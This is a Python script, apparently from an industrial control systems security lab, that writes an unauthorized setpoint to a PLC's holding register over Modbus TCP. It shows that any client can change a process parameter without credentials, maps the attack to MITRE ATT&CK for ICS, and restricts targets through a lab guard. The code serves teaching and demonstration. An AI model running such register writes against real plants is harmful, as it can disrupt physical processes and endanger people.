"""
03_unauthorized_write_setpoint.py - Manipulacion NO autorizada del setpoint.

MITRE ATT&CK for ICS: T0836 - Modify Parameter (tactica Impair Process Control,
TA0106), con impacto T0831 - Manipulation of Control.
https://attack.mitre.org/techniques/T0836/
https://attack.mitre.org/techniques/T0831/

Modbus TCP no distingue entre "el HMI legitimo" y cualquier otro cliente:
ambos pueden escribir el holding register 0 (setpoint). Este script escribe
un valor de setpoint alto sin pasar por el HMI, para que el propio bucle de
control legitimo del PLC (que SI confia en ese registro) persiga un objetivo
que el atacante elige. El interlock de seguridad de nivel alto sigue activo
(no es alcanzable por Modbus, ver plc/PROCESO.md) — el objetivo de esta demo
no es "reventar" el deposito sino mostrar como un parametro de proceso sin
proteccion basta para forzar un comportamiento anomalo (bomba forzada,
alarma parpadeando) sin ninguna credencial.

Uso: python 03_unauthorized_write_setpoint.py [--host 192.168.20.10] [--valor 1000]
"""
import argparse

from pymodbus.client import ModbusTcpClient

from _lab_guard import ensure_lab_target

REG_SETPOINT = 0
REG_NIVEL = 1


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="192.168.20.10")
    parser.add_argument("--port", type=int, default=502)
    parser.add_argument("--unit-id", type=int, default=1)
    parser.add_argument(
        "--valor",
        type=int,
        default=1000,
        help="Nuevo setpoint, escala 0-1000 (0-100.0%%). Por defecto 1000 = 100%%.",
    )
    args = parser.parse_args()

    ensure_lab_target(args.host)

    client = ModbusTcpClient(args.host, port=args.port)
    if not client.connect():
        print(f"[!] No se pudo conectar a {args.host}:{args.port}")
        return

    antes = client.read_holding_registers(address=REG_SETPOINT, count=1, device_id=args.unit_id)
    print(f"[*] Setpoint antes del ataque: {antes.registers[0] / 10:.1f} %")

    print(f"[*] Escribiendo setpoint no autorizado: {args.valor / 10:.1f} % ...")
    resp = client.write_register(address=REG_SETPOINT, value=args.valor, device_id=args.unit_id)

    if resp.isError():
        print("[!] La escritura fallo (revisa si el conducto esta segmentado/bloqueado).")
    else:
        despues = client.read_holding_registers(address=REG_SETPOINT, count=1, device_id=args.unit_id)
        print(f"[+] Escritura aceptada. Setpoint ahora: {despues.registers[0] / 10:.1f} %")
        print(
            "[+] Observa el HMI (http://localhost:5000): el PLC perseguira "
            "este setpoint como si lo hubiera puesto el operador legitimo."
        )

    client.close()


if __name__ == "__main__":
    main()
